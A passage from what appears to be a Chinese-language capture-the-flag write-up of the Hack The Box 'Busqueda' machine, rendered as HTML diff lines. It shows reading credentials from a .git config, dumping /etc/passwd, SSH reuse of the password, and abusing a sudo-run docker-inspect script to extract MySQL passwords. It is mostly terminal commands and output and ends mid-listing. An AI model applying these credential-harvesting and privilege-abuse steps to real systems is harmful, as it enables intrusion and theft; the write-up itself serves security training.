class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">@app.route(&#x27;</span>/search<span class="hljs-number">&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def search():<br>    try:<br>        engine = request.form.get(<span class="hljs-string">&#x27;engine&#x27;</span>)<br>        query = request.form.get(<span class="hljs-string">&#x27;query&#x27;</span>)<br>        auto_redirect = request.form.get(<span class="hljs-string">&#x27;auto_redirect&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> engine in Engine.__members__.keys():<br>            arg_list = [<span class="hljs-string">&#x27;searchor&#x27;</span>, <span class="hljs-string">&#x27;search&#x27;</span>, engine, query]<br>            r = subprocess.run(arg_list, capture_output=True)<br>            url = r.<span class="hljs-built_in">stdout</span>.strip().decode()<br>            <span class="hljs-keyword">if</span> auto_redirect is not None:<br>                <span class="hljs-keyword">return</span> redirect(url, code=<span class="hljs-number">302</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> url<br><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, options=Engine.__members__, error=<span class="hljs-string">&quot;Invalid engine!&quot;</span>)<br><br>    except Exception as e:<br>        print(e)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, options=Engine.__members__, error=<span class="hljs-string">&quot;Something went wrong!&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=False)<br>svc@busqueda:/var/www/app$ cd /.git/<br>cd /.git/<br>bash: cd: /.git/: No such file or directory<br>svc@busqueda:/var/www/app$ cd .git<br>cd .git<br>svc@busqueda:/var/www/app/.git$ ls<br>ls<br>branches<br>COMMIT_EDITMSG<br>config<br>description<br>HEAD<br>hooks<br>index<br>info<br>logs<br>objects<br>refs<br>svc@busqueda:/var/www/app/.git$ ls -la<br>ls -la<br>total <span class="hljs-number">52</span><br>drwxr-xr-x <span class="hljs-number">8</span> www-data www-data <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .<br>drwxr-xr-x <span class="hljs-number">4</span> www-data www-data <span class="hljs-number">4096</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> ..<br>drwxr-xr-x <span class="hljs-number">2</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> branches<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data   <span class="hljs-number">15</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> COMMIT_EDITMSG<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data  <span class="hljs-number">294</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> config<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data   <span class="hljs-number">73</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> description<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data   <span class="hljs-number">21</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> HEAD<br>drwxr-xr-x <span class="hljs-number">2</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> hooks<br>-rw-r--r-- <span class="hljs-number">1</span> root     root      <span class="hljs-number">259</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> index<br>drwxr-xr-x <span class="hljs-number">2</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> info<br>drwxr-xr-x <span class="hljs-number">3</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> logs<br>drwxr-xr-x <span class="hljs-number">9</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> objects<br>drwxr-xr-x <span class="hljs-number">5</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> refs<br>svc@busqueda:/var/www/app/.git$ cd config<br>cd config<br>bash: cd: config: Not a directory<br>svc@busqueda:/var/www/app/.git$ cat config<br>cat config<br>[core]<br>        repositoryformatversion = <span class="hljs-number">0</span><br>        filemode = <span class="hljs-literal">true</span><br>        bare = <span class="hljs-literal">false</span><br>        logallrefupdates = <span class="hljs-literal">true</span><br>[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>        url = http:<span class="hljs-comment">//cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br>        fetch = +refs/heads<span class="hljs-comment">/*:refs/remotes/origin/*</span><br><span class="hljs-comment">[branch &quot;main&quot;]</span><br><span class="hljs-comment">        remote = origin</span><br><span class="hljs-comment">        merge = refs/heads/main</span><br><span class="hljs-comment">svc@busqueda:/var/www/app/.git$ </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">svc@busqueda:/var/www/app/.git$ cat /etc/passwd</span><br><span class="hljs-comment">cat /etc/passwd</span><br><span class="hljs-comment">root:x:0:0:root:/root:/bin/bash</span><br><span class="hljs-comment">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="hljs-comment">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="hljs-comment">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="hljs-comment">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="hljs-comment">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="hljs-comment">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="hljs-comment">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="hljs-comment">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="hljs-comment">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="hljs-comment">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="hljs-comment">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="hljs-comment">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="hljs-comment">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="hljs-comment">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="hljs-comment">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="hljs-comment">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="hljs-comment">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-comment">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-comment">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="hljs-comment">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="hljs-comment">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-comment">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="hljs-comment">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="hljs-comment">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="hljs-comment">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="hljs-comment">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="hljs-comment">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-comment">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="hljs-comment">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="hljs-comment">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="hljs-comment">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br><span class="hljs-comment">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="hljs-comment">fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="hljs-comment">dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="hljs-comment">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br><span class="hljs-comment">svc@busqueda:/var/www/app/.git$</span><br></code></pre></td></tr></table></figure>
+
+<p>10、到这里，预感上面发现的密码就是可以登录的用户的密码，开始尝试下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh svc@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span> <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.208 (10.10.11.208)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-keyword">continue</span> <span class="hljs-title function_">connecting</span> <span class="hljs-params">(yes/no/[fingerprint])</span>? yes<br>Warning: Permanently added &#x27;10.10.11.208&#x27; <span class="hljs-params">(ED25519)</span> to the <span class="hljs-built_in">list</span> of known hosts.<br>svc@10.10.11.208&#x27;s password: <br>Welcome to Ubuntu 22.04.2 <span class="hljs-title function_">LTS</span> <span class="hljs-params">(GNU/Linux <span class="hljs-number">5.15</span><span class="hljs-number">.0</span><span class="hljs-number">-69</span>-generic x86_64)</span><br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>  System information as of Thu Apr 18 03:10:58 PM UTC 2024<br><br>  System load:                      0.0<br>  Usage of /:                       81.1% of 8.26GB<br>  Memory usage:                     56%<br>  Swap usage:                       0%<br>  Processes:                        236<br>  Users logged in:                  0<br>  IPv4 address <span class="hljs-keyword">for</span> br-c954bf22b8b2: 172.20.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> br-cbf2c5ce8e95: 172.19.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> br-fba5a3e31476: 172.18.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> docker0:         172.17.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> eth0:            10.10.11.208<br><br><br> * Introducing Expanded Security Maintenance <span class="hljs-keyword">for</span> Applications.<br>   Receive updates to over 25,000 software packages with your<br>   Ubuntu Pro subscription. Free <span class="hljs-keyword">for</span> personal use.<br><br>     https:<span class="hljs-comment">//ubuntu.com/pro</span><br><br>Expanded Security Maintenance <span class="hljs-keyword">for</span> Applications is not enabled.<br><br>0 updates can be applied immediately.<br><br>Enable ESM Apps to receive additional <span class="hljs-built_in">future</span> security updates.<br>See https:<span class="hljs-comment">//ubuntu.com/esm or run: sudo pro status</span><br><br><br>The <span class="hljs-built_in">list</span> of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19<br>svc@busqueda:~$ <br></code></pre></td></tr></table></figure>
+
+<p>11、继续枚举信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:~$ id<br>uid=<span class="hljs-number">1000</span>(svc) gid=<span class="hljs-number">1000</span>(svc) groups=<span class="hljs-number">1000</span>(svc)<br>svc@busqueda:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> svc: <br>Matching Defaults entries <span class="hljs-keyword">for</span> svc on busqueda:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User svc may run the following commands on busqueda:<br>    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *<br>svc@busqueda:~$ <br><br>svc@busqueda:~$ ls -la /opt/scripts/system-checkup.py<br>-rwx--x--x <span class="hljs-number">1</span> root root <span class="hljs-number">1903</span> Dec <span class="hljs-number">24</span>  <span class="hljs-number">2022</span> /opt/scripts/system-checkup.py<br>svc@busqueda:~$ cat /opt/scripts/system-checkup.py<br>cat: /opt/scripts/system-checkup.py: Permission denied<br>svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py<br>Sorry, user svc is not allowed to execute <span class="hljs-string">&#x27;/usr/bin/python3 /opt/scripts/system-checkup.py&#x27;</span> as root on busqueda.<br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py<br>Sorry, user svc is not allowed to execute <span class="hljs-string">&#x27;/usr/bin/python3 /opt/scripts/system-checkup.py&#x27;</span> as root on busqueda.<br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<br>Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)<br><br>     docker-ps     : List running docker containers<br>     docker-inspect : Inpect a certain docker container<br>     full-checkup  : Run a full system checkup<br><br>svc@busqueda:~$ <br><br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps<br>CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES<br><span class="hljs-number">960873171e2</span>e   gitea/gitea:latest   <span class="hljs-string">&quot;/usr/bin/entrypoint…&quot;</span>   <span class="hljs-number">15</span> months ago   Up <span class="hljs-number">55</span> minutes   <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3000</span>-&gt;<span class="hljs-number">3000</span>/tcp, <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">222</span>-&gt;<span class="hljs-number">22</span>/tcp   gitea<br>f84a6b33fb5a   mysql:<span class="hljs-number">8</span>              <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">15</span> months ago   Up <span class="hljs-number">55</span> minutes   <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>-&gt;<span class="hljs-number">3306</span>/tcp, <span class="hljs-number">33060</span>/tcp               mysql_db<br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect<br>Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;<br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <span class="hljs-number">960873171e2</span>e<br>Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;<br>svc@busqueda:~$ <br><br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <br>Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;<br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#123;&#123;.LogPath&#125;&#125; <span class="hljs-number">960873171e2</span>e<br>/var/lib/docker/containers/<span class="hljs-number">960873171e2</span>e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/<span class="hljs-number">960873171e2</span>e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.<span class="hljs-built_in">log</span><br><br>svc@busqueda:~$ <br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#123;&#123;.Config&#125;&#125; f84a6b33fb5a<br>&#123;f84a6b33fb5a   <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">3306</span>/tcp:&#123;&#125; <span class="hljs-number">33060</span>/tcp:&#123;&#125;] <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=<span class="hljs-number">1.14</span> MYSQL_MAJOR=<span class="hljs-number">8.0</span> MYSQL_VERSION=<span class="hljs-number">8.0</span><span class="hljs-number">.31</span><span class="hljs-number">-1.</span>el8 MYSQL_SHELL_VERSION=<span class="hljs-number">8.0</span><span class="hljs-number">.31</span><span class="hljs-number">-1.</span>el8] [mysqld] &lt;nil&gt; <span class="hljs-literal">false</span> mysql:<span class="hljs-number">8</span> <span class="hljs-built_in">map</span>[/var/lib/mysql:&#123;&#125;]  [docker-entrypoint.sh] <span class="hljs-literal">false</span>  [] <span class="hljs-built_in">map</span>[com.docker.compose.config-hash:<span class="hljs-number">1b</span>3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:<span class="hljs-number">1</span> com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:<span class="hljs-number">1.29</span><span class="hljs-number">.2</span>]  &lt;nil&gt; []&#125;<br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#123;&#123;.Config&#125;&#125; <span class="hljs-number">960873171e2</span>e<br>&#123;<span class="hljs-number">960873171e2</span>e   <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">22</span>/tcp:&#123;&#125; <span class="hljs-number">3000</span>/tcp:&#123;&#125;] <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> <span class="hljs-literal">false</span> [USER_UID=<span class="hljs-number">115</span> USER_GID=<span class="hljs-number">121</span> GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:<span class="hljs-number">3306</span> GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] &lt;nil&gt; <span class="hljs-literal">false</span> gitea/gitea:latest <span class="hljs-built_in">map</span>[/data:&#123;&#125; /etc/localtime:&#123;&#125; /etc/timezone:&#123;&#125;]  [/usr/bin/entrypoint] <span class="hljs-literal">false</span>  [] <span class="hljs-built_in">map</span>[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:<span class="hljs-number">1</span> com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:<span class="hljs-number">1.29</span><span class="hljs-number">.2</span> maintainer:maintainers@gitea.io org.opencontainers.image.created:<span class="hljs-number">2022</span><span class="hljs-number">-11</span><span class="hljs-number">-24</span>T13:<span class="hljs-number">22</span>:<span class="hljs-number">00</span>Z org.opencontainers.image.revision:<span class="hljs-number">9b</span>ccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https:<span class="hljs-comment">//github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  &lt;nil&gt; []&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>12、这里在枚举的时候，通过读取docker的配置文件，发现了两个数据账号密码信息，在枚举数据之前，先使用脚本查看下MySQL数据的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-inspect <span class="hljs-string">&#x27;&#123;&#123;json .NetworkSettings.Networks&#125;&#125;&#x27;</span> mysql_db | jq .<br>[sudo] password <span class="hljs-keyword">for</span> svc: <br>&#123;<br>  <span class="hljs-string">&quot;docker_gitea&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: null,<br>    <span class="hljs-string">&quot;Links&quot;</span>: null,<br>    <span class="hljs-string">&quot;Aliases&quot;</span>: [<br>      <span class="hljs-string">&quot;f84a6b33fb5a&quot;</span>,<br>      <span class="hljs-string">&quot;db&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227&quot;</span>,<br>    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;6f31d971c8802d120f8d698d15aefc8582d0417dba4155206e4b0fe9055b2ff4&quot;</span>,<br>    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.19.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.19.0.3&quot;</span>,<br>    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:13:00:03&quot;</span>,<br>    <span class="hljs-string">&quot;DriverOpts&quot;</span>: null<br>  &#125;<br>&#125;<br>svc@busqueda:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>13、到这里，知道了MySQL数据库IP地址信息，那就开始登录枚举吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:/tmp$ mysql -h <span class="hljs-number">172.19</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span> -u gitea -pyuiu1hoiu4i5ho1uh gitea<br>mysql: [Warning] Using a password on the command line interface can be insecure.<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is <span class="hljs-number">60</span><br>Server version: <span class="hljs-number">8.0</span><span class="hljs-number">.31</span> MySQL Community Server - GPL<br><br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(c)</span> 2000, 2023, Oracle and/or its affiliates.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;<span class="hljs-string">&#x27; or &#x27;</span>\h<span class="hljs-number">&#x27;</span> <span class="hljs-keyword">for</span> help. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show table<br>    -&gt; ;<br>ERROR <span class="hljs-number">1064</span> (<span class="hljs-number">42000</span>): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to use near <span class="hljs-string">&#x27;&#x27; at line 1</span><br><span class="hljs-string">mysql&gt; show tables;</span><br><span class="hljs-string">+---------------------------+</span><br><span class="hljs-string">| Tables_in_gitea           |</span><br><span class="hljs-string">+---------------------------+</span><br><span class="hljs-string">| access                    |</span><br><span class="hljs-string">| access_token              |</span><br><span class="hljs-string">| action                    |</span><br><span class="hljs-string">| app_state                 |</span><br><span class="hljs-string">| attachment                |</span><br><span class="hljs-string">| badge                     |</span><br><span class="hljs-string">| collaboration             |</span><br><span class="hljs-string">| comment                   |</span><br><span class="hljs-string">| commit_status             |</span><br><span class="hljs-string">| commit_status_index       |</span><br><span class="hljs-string">| deleted_branch            |</span><br><span 